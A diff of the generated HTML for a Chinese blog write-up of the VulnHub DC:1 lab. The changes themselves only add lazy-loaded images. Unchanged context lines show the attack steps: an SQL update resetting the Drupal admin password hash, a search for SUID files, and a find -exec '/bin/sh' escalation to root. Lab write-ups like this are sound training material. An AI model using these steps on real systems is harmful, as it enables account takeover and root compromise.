 <figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use drupaldb;</span><br><span class="line"></span><br><span class="line"><span class="keyword">update</span> users <span class="keyword">set</span> pass<span class="operator">=</span>&quot;$S$DUKfIRZztxmhlJ9B3U8br8nSw3XMp0ZCJw2j.b5AUpjbUfLvupWN&quot; <span class="keyword">where</span> name<span class="operator">=</span>&quot;admin&quot;;</span><br></pre></td></tr></table></div></figure>
 
-<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DC%EF%BC%9A1/0d0b56652ef24f88b5604da159a216c2.png" alt="在这里插入图片描述"></p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DC%EF%BC%9A1/0d0b56652ef24f88b5604da159a216c2.png"  alt="在这里插入图片描述">
+      </p>
 <p>然后回到网页登录。</p>
 <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: admin</span><br><span class="line">password: adminpass</span><br></pre></td></tr></table></div></figure>
 
 <p>火狐浏览器不知道怎么回事登不上，换了谷歌浏览器成功登入。搞得我以为攻击失败了，排查了半天……</p>
-<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DC%EF%BC%9A1/e01e758b76ad472ba5ed2b4c1adad3c4.png" alt="在这里插入图片描述"></p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DC%EF%BC%9A1/e01e758b76ad472ba5ed2b4c1adad3c4.png"  alt="在这里插入图片描述">
+      </p>
 <p>找到 flag3。</p>
-<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DC%EF%BC%9A1/133e04cc2a564235a4fef12bc5a1181f.png" alt="在这里插入图片描述"></p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DC%EF%BC%9A1/133e04cc2a564235a4fef12bc5a1181f.png"  alt="在这里插入图片描述">
+      </p>
 <p>得到提示。</p>
-<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DC%EF%BC%9A1/3fa6af10ebcd4a44b9ce0fad505f34e9.png" alt="在这里插入图片描述"></p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DC%EF%BC%9A1/3fa6af10ebcd4a44b9ce0fad505f34e9.png"  alt="在这里插入图片描述">
+      </p>
 <p>最后一个 flag 是在 <font style="background:#70AD47">&#x2F;root&#x2F;home&#x2F;</font> 目录中。</p>
 
         <h2 id="2-3：后渗透"   >
@@ -193,12 +268,21 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.3.0"></he
 <p>可以使用 <code>sudo -l</code> 查看用户可在系统上具有的 sudo 权限，以及可以运行的特权命令与文件。不过当前用户无法使用 <code>sudo</code> 命令。</p>
 <p>使用 <code>find</code> 命令查找有 suid 属性权限的文件。</p>
 <p><strong>查找 suid 属性权限文件</strong>：<br><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
-<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DC%EF%BC%9A1/1917d98c65f74a7dbd0821d0de5d3392.png" alt="在这里插入图片描述"></p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DC%EF%BC%9A1/1917d98c65f74a7dbd0821d0de5d3392.png"  alt="在这里插入图片描述">
+      </p>
 <p><strong>提权</strong>：<br><code>find /usr/bin/passwd -exec &#39;/bin/sh&#39; \;</code></p>
-<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DC%EF%BC%9A1/8d7770e77fab4c248fd4307979592fb3.png" alt="在这里插入图片描述"></p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DC%EF%BC%9A1/8d7770e77fab4c248fd4307979592fb3.png"  alt="在这里插入图片描述">
+      </p>
 <p>可以看到提权成功。</p>
 <p>这里不考虑痕迹隐藏，拿到 root 权限就已经结束咯。</p>
-<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DC%EF%BC%9A1/4c90e35fb14e48c2a03d05ce1253bebc.png" alt="在这里插入图片描述"></p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DC%EF%BC%9A1/4c90e35fb14e48c2a03d05ce1253bebc.png"  alt="在这里插入图片描述">
+      </p>
 
         <h1 id="3：总结"   >
           <a href="#3：总结" class="heading-link"><i class="fas fa-link"></i></a><a href="#3：总结" class="headerlink" title="3：总结"></a>3：总结</h1>
@@ -352,7 +436,7 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.3.0"></he
           2.3：后渗透</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3%EF%BC%9A%E6%80%BB%E7%BB%93"><span class="toc-text">
           3：总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1%EF%BC%9A%E5%91%BD%E4%BB%A4-%E5%B7%A5%E5%85%B7"><span class="toc-text">
           3.1：命令 &amp; 工具</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2%EF%BC%9A%E5%85%B3%E9%94%AE%E6%8A%80%E6%9C%AF"><span class="toc-text">
-          3.2：关键技术</span></a></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/notAlone.png" alt="avatar"></div><p class="sidebar-ov-author__text">但愿五湖明月在。</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">53</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">21</div><div class="sidebar-ov-state-item__name">分类</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2022~2024</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>镜坛主</span></div><div>欢迎来到 —— 镜坛！</div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax@latest/pjax.min.js"></script><script>window.addEventListener('DOMContentLoaded', function () {
+          3.2：关键技术</span></a></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/notAlone.png" alt="avatar"></div><p class="sidebar-ov-author__text">但愿五湖明月在。</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">53</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">21</div><div class="sidebar-ov-state-item__name">分类</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2022~2024</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>镜坛主</span></div><div>欢迎来到 —— 镜坛！</div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lazyload@2.0.0-rc.2/lazyload.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax@latest/pjax.min.js"></script><script>window.addEventListener('DOMContentLoaded', function () {
   var pjax = new Pjax({"selectors":["head title","#main",".pjax-reload",".header-banner"],"history":true,"scrollTo":false,"scrollRestoration":false,"cacheBust":false,"debug":false,"currentUrlFullReload":false,"timeout":0});
   // 加载进度条的计时器
   var loadingTimer = null;
